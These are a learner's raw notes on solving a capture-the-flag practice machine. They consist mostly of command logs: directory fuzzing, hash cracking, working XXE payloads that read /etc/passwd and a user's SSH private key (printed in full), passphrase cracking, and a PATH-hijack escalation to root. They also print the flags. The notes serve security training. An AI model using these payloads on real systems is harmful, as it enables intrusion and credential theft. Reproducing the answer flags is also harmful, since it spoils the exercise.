ping 10.10.166.42

dirb http://10.10.166.42                                                                      148 ⨯ 1 ⚙

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Dec 21 10:56:42 2021
URL_BASE: http://10.10.166.42/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.166.42/ ----
==> DIRECTORY: http://10.10.166.42/custom/                                                                 
==> DIRECTORY: http://10.10.166.42/fonts/                                                                  
==> DIRECTORY: http://10.10.166.42/images/                                                                 
+ http://10.10.166.42/index.html (CODE:200|SIZE:1752)                                                      
+ http://10.10.166.42/robots.txt (CODE:200|SIZE:28)                                                        
+ http://10.10.166.42/server-status (CODE:403|SIZE:277)                                                    
                                                                                                           
---- Entering directory: http://10.10.166.42/custom/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                           
---- Entering directory: http://10.10.166.42/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                           
---- Entering directory: http://10.10.166.42/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue Dec 21 10:58:16 2021
DOWNLOADED: 4612 - FOUND: 3




--> looking round the site I found the contact form, potentially vulnerable to xss
-->contact.html?fname=.. --> clearly a possible vulnerability to ssti


--> viewing page source; father, actor, nerd - potential users?


nmap -sC -sV 10.10.166.42                                                                           1 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-21 11:09 EST
Nmap scan report for 10.10.166.42
Host is up (0.019s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.67 seconds


--> ssh port means there might be an option to log in using ssh connectino, but I dont have a username or password.
--> the hint said to look at the page source, which I did for all the pages but found nothing
--> saw a writeup mentino to fuzz with ffuf which I have not done before so thought Id give it a try

ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.10.166.42/FUZZ -c -e .txt,.html,.php  1 ⨯ 1 ⚙

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.166.42/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Extensions       : .txt .html .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
.hta.php                [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess.php           [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess.html          [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess.txt           [Status: 403, Size: 277, Words: 20, Lines: 10]
.hta.txt                [Status: 403, Size: 277, Words: 20, Lines: 10]
.hta.html               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd.txt           [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd.php           [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd.html          [Status: 403, Size: 277, Words: 20, Lines: 10]
about.html              [Status: 200, Size: 3152, Words: 331, Lines: 65]
                        [Status: 200, Size: 1752, Words: 77, Lines: 73]
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10]
.html                   [Status: 403, Size: 277, Words: 20, Lines: 10]
blog.html               [Status: 200, Size: 3172, Words: 274, Lines: 84]
contact.html            [Status: 200, Size: 1450, Words: 68, Lines: 52]
custom                  [Status: 301, Size: 313, Words: 20, Lines: 10]
fonts                   [Status: 301, Size: 312, Words: 20, Lines: 10]
gallery.html            [Status: 200, Size: 1950, Words: 69, Lines: 91]
images                  [Status: 301, Size: 313, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 1752, Words: 77, Lines: 73]
index.html              [Status: 200, Size: 1752, Words: 77, Lines: 73]
robots.txt              [Status: 200, Size: 28, Words: 3, Lines: 3]
robots.txt              [Status: 200, Size: 28, Words: 3, Lines: 3]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
:: Progress: [18456/18456] :: Job [1/1] :: 2143 req/sec :: Duration: [0:00:13] :: Errors: 0 ::


--> I decided to have a look at the ones with the 301 code (as this means redirecting)
--> under custom I found the users.bak file which I downloaded and saved
--> checking the file using file and strings it appears to be an SQLite file

file users.bak                                                                                      2 ⚙
users.bak: SQLite 3.x database, last written using SQLite version 3034001

strings users.bak
SQLite format 3
tableusersusers
CREATE TABLE users(username text NOT NULL, password text NOT NULL)
]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

--> proceeded to try sqlite but wasnt a command so auto completed it with tab and got sqlite3, so ran it with users.bak as an argument

sqlite> .help

sqlite> .databases
main: /home/kali/THM/practice/mustacchio/users.bak r/w

sqlite> .tables
users

sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users(username text NOT NULL, password text NOT NULL);
INSERT INTO users VALUES('admin','1868e36a6d2b17d4c2745f1659433a54d4bc5f4b');
COMMIT;

--> now I am guessing this means the ssh username is admin and password is the string, but it seems base64 encoded
--> next step is to try to decode it
echo "1868e36a6d2b17d4c2745f1659433a54d4bc5f4b" | base64 -d                                     1 ⨯ 4 ⚙
�μ{~��ݛ׷xsn���z��7ݮxw����        
--> looks like it might not be encoded, at least not base64 so try to connect to ssh beofre trying to decode it with another hash - maybe md5

ssh admin@10.10.166.42                                                                              4 ⚙
The authenticity of host '10.10.166.42 (10.10.166.42)' can't be established.
ECDSA key fingerprint is SHA256:ZZet5QyZ8Pn5+08sVBFZdDzP/6yZEQeNpRZEd5DLLks.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.166.42' (ECDSA) to the list of known hosts.
admin@10.10.166.42: Permission denied (publickey).

--> well that didnt work...
--> checking what hash it is online
 Possible identifications: Decrypt Hashes

1868e36a6d2b17d4c2745f1659433a54d4bc5f4b - bulldog19 - Possible algorithms: SHA1
                    
--> so I could use a decrypter to decrypt it but it seems its already done and the password is bulldog19
--> now, where to log in? I havent seen a login portal.. (after checking another writeup I decided to do a more extensive nmap scan)
--> missing nmap ports? = more extensive scan
nmap -p- --min-rate 10000 10.10.166.42                                                        255 ⨯ 4 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-21 12:07 EST
Nmap scan report for 10.10.166.42
Host is up (0.019s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8765/tcp open  ultraseek-http

Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds

--> found the 8765 port previously missed
--> --min-rate 10000 is used to notify the scan to send 10000 packets per second, lower this as needed to find more specific / hidden ports

--> nect I navigated to this port
http://10.10.166.42:8765/
--> WE GOT A LOGIN PAGE
--> logged in using admin and bulldog19 combination and there's a comment box
--> submitted 'hello' and saw the comment preview came out bugged - surely some vulnerability on here
--> checking the source code I saw this:
<!-- Barry, you can now SSH in using your key!-->

--> so there's a user we can connect to ssh using barry@10.10.166.42, but what password?
--> didnt work

--> viewing the page source there is a session cookie that might be possible to use, maybe time to fire up burp?
--> another comment caught my eye:
//document.cookie = "Example=/auth/dontforget.bak";

-->submitted a comment and proxied it to burp to see what happened and to get more info:
POST /home.php HTTP/1.1
Host: 10.10.166.42:8765
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://10.10.166.42:8765
Connection: close
Referer: http://10.10.166.42:8765/home.php
Cookie: PHPSESSID=1rojdkvouevdok6ronm0uaaju6
Upgrade-Insecure-Requests: 1

xml=hello+there


--> the POST method is xml?? mens hteres some data storage somewhere
--> next I wanna try to get the /auth/dontforget.bak file by diong a get request:
--> going to http://10.10.166.42/auth/dontforget.bak gave me a file which I downloaded
mv /home/kali/Downloads/dontforget.bak /home/kali/THM/practice/mustacchio/dontforget.bak

file dontforget.bak                                                                                 4 ⚙
dontforget.bak: XML 1.0 document, UTF-8 Unicode text, with very long lines, with CRLF line terminators

strings dontforget.bak                                                                              4 ⚙
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could
ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could
ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>

--> using burp I tried submitting an empty comment, but edited the POST request to:
Cookie: PHPSESSID=1rojdkvouevdok6ronm0uaaju6;Example=/auth/dontforget.bak
xml=<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com></com>
</comment>

--> then I forwarded this, and it registered the name and author!! 

--> now I had no idea where to go from here, I initially figured XSS but it was not right;
--> XXE vulnerability (not seen this before so read up on it on this page: https://portswigger.net/web-security/xxe
--> trying something along the lines of that below:
xml=
<!DOCTYPE+replace+[<!ENTITY+xxe+SYSTEM+'file%3a///etc/passwd'>+]>
<comment>
++<name>%26xxe%3b</name>
++<author>Barry+Clad</author>
++<com></com>
</comment>

--> AND IT FINALLY WORKED (I tried for a long time without the + and right characters but theyre important!!
--> output:

Name: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false joe:x:1002:1002::/home/joe:/bin/bash barry:x:1003:1003::/home/barry:/bin/bash

--> from here: barry:x:1003:1003::/home/barry:/bin/bash
--> try to read the id_rsa key to be able to connect using ssh, USING THE SAME METHOD IN BURP:
xml=
<!DOCTYPE+replace+[<!ENTITY+xxe+SYSTEM+'file%3a///home/barry/.ssh/id_rsa'>+]>
<comment>
++<name>%26xxe%3b</name>
++<author>Barry+Clad</author>
++<com></com>
</comment>

--> WE GOT THE KEY!

-----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65 l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk 4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8 7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+ T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7 LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF 6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs 7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of 1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ +Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn 7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD -----END RSA PRIVATE KEY-----

--> after containing this its time to try and crack the hash to get the password
--> I try this using ssh2john, which I have actually done once before
--> method is to store the id_rsa key in a file and then run ssh2john.py with it as input
nano id_rsa (paste the key into this)

locate ssh2john                                                                                     9 ⚙
/usr/share/john/ssh2john.py

--> #1 run:
/usr/share/john/ssh2john.py id_rsa > id_rsa.john                                                    9 ⚙
id_rsa is not a valid private key file

--> this gave an error so I had to fix the file so it was formatted like a proper rsa key file:

cat id_rsa                                                                                      1 ⨯ 9 ⚙
-----BEGIN RSA PRIVATE KEY----- 
Proc-Type: 4,ENCRYPTED 
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E 

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----


--> this is stored in the id_rsa.john file and looks like this
cat id_rsa.john                                                                                     9 ⚙
id_rsa:$sshng$1$16$D137279D69A43E71BB7FCB87FC61D25E$1200$8ea0c93fe6e552bfb1325012601f6de20172325f55ba01d0240ca519913a27f6f59c6e7b78660e33cc1d66f54c1ab7cd6cd2556578fa565b9932bf6e117f18e2f0b66edd8a081885836db807ad73e17268896437e46fdb5ecd591b15e8348314319749ec31f5936dbaa9032d9b8abde8c64a110e5915ad37d92a21b5f0cfb288a6ffb74d6a910eba3466c3eaee044eb99767fdc1909f0da119bf1092c901432630579b4ee6a9f489ddde7d77086b1bd76eaeebb5fda95452f23f8ccf1b392d8359fc9fde79185d6c83e123c249329ccb853d616dba2c6eca3052dc59c1b40f797a9750f0c9e50166673c500b90147ec436c36cc15ca492bde0b3097604c4ea1b3d5bc3fd6039d0a3dc1c9cd4b27a9915977c3dc74a659c73ff1b1df76f552810ba5ec0f113a5cefae2eff58795c200d527dcac56948fcbdf5e2e777e2a7d8016cb7fab323a8d330c9e15bf0df270e89e4c7e9bea61857b146249a13fbb7af9e2f6732f4287817b5aa736f880397fc90268df0a83d457d8ec00b5d9e51cf4d742adcbc6f1770383ea014289039c65529c69a6be63f122c5534f7d36ef2933c1e8b759595a80c04238efde92861e3569576e1975a93b50eae0b59078f24c750a359541efc78349a9e4a0444bc9f71d6b8f64fdec476584e698a29c763350f8a364e1ca6f946f50a79161eee1420d6a2113fa842e944a678fe4e87880e054b5dc3e7d265bcb08a43a23039f2119ecb5807cefe6283243d61ef2a3992fef317f9e95c65cbe1e3b28d74d978910c7ae414939ab5122bc1a01a7a8826edbf1b57c193e4fe81671e4b9d56af1209ba29a68f0b850f74b65d96955c949d2bb8af0f713c29f5a380cc74cd716ee0c72709f0169226a162679a77a5a2587b4cf7c1bf850e8aeb23c33bb18387b059b8c829343fcb6d2fafa413d1cd7a2d0a55c7e90f7d23b2c8b9008de6109bf191c50f4e80f85d9a64da60d06ec5b324f04e7002b592d9eb519dc61362fb7b633950c64243d552ca6487d82abf9fa6759e8b544a90df5796db376d0947d4bb8592cebf809dd1cf6b696ab7dd0ffb01f68927786cc4acc6095a5cf5dd7152719b04ecf8a979e9f46898a0fd61d3ed0f852fcabe770a1ec28a224db05260e25636b3b5a2025c71f68be924b18cb69ce183c017245540b706910053f19f9e32d452135d7ead8af93adb20d18cfb177f3c1b30db2f18582f40a0d991a78af9b0635eb9aea83e0407d2b9e3446e3ba77b922c0a3674d5813b295a554279b31f2c88bbe922adc4b5699c5e9a6a4da226430843d2346ee90338b5cc380a046a694a253e60fb06420b969423a7191b432fd1729b497d834e6872505724414fdd719731f545e8205871ec37acaaba014d1e9f10196ab27ece3e54858f49401c70a022cc4f6b09a5bd29b76ecedb7687e19590635d874895980102a76ae6304953c1ad15c1b2a61f5c6f77fe0b79e499e0d9246449c315187944bd39fd5d5647d65211f6c7d6a959157ca4933f0720ddd243566bf73ffccac6334f832a41e801929f0e5dec0b481d441ee4510f99f3b9c5226c70f7977156fa195d9be83126fb3af7f6ec052151e794f1cb56b1e94a4663f0e7afb184e6c1a006d1227ee6c4dfcde4b968b1379f2679617488480d30ccb04c2300203eabaf3af9b44477e76b6a3824e91f5e2a048c13b81e543


--> #2 is to run john on the .john file:
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john                                        9 ⚙
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
urieljames       (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:02 DONE (2021-12-21 15:06) 0.3690g/s 5292Kp/s 5292Kc/s 5292KC/sa6_123..*7¡Vamos!
Session completed

--> now we ssh into the target!!
ssh -i id_rsa barry@10.10.31.79                                                               255 ⨯ 9 ⚙
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
barry@10.10.31.79: Permission denied (publickey).

--> clearly shows an error so try to edit access:
chmod 600 id_rsa

--> rerun:
ssh -i id_rsa barry@10.10.31.79                                                                     9 ⚙
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
16 of these updates are security updates.
To see these additional updates run: apt list --upgradable



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

barry@mustacchio:~$


--> WE GOT A SHELL!!:)

--> after running whoami and id I realise were on a linux system (?)
barry@mustacchio:~$ ls
user.txt

barry@mustacchio:~$ cat user.txt
62d77a4d5f97d47c5aa38b3b2651b831

########## we got the first flag:) ##########

--> next up = escalate our privileges
--> started by looking around the system, particularily running `ls -la`
--> I go into the joe user's directory and find live_log which has root privileges: maybe I can run this as root and escalate?

--> from here I was a bit lost, again lack of experience, so looking at a writeup I see you can download it:
barry@mustacchio:/home/joe$ file live_log
live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped

--> also ran strings live_log
--> found its a Live Nginx Log Reader (no PATH set so we can exploit it)
barry@mustacchio:/home/joe$ cd /tmp

barry@mustacchio:/tmp$ echo "/bin/bash">tail

barry@mustacchio:/tmp$ ls
tail

barry@mustacchio:/tmp$ chmod +700 tail

barry@mustacchio:/tmp$ export PATH=/tmp:$PATH

barry@mustacchio:/tmp$ /home/joe/live_log

root@mustacchio:/tmp# whoami
root

--> we got root access!! now can we find the flag?
--> we go up to the parent directory and enter the root directory and see if theres a file there
root@mustacchio:/tmp# cd ..

root@mustacchio:/# ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  vagrant  vmlinuz
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  var      vmlinuz.old

root@mustacchio:/# cd root

root@mustacchio:/root# ls
root.txt

root@mustacchio:/root# cat root.txt
3223581420d906c4dd1a5f9b530393a5

--> FLAG FOUND:)
and thats it, now I am going to be reading up on the privilege meethod and XXE
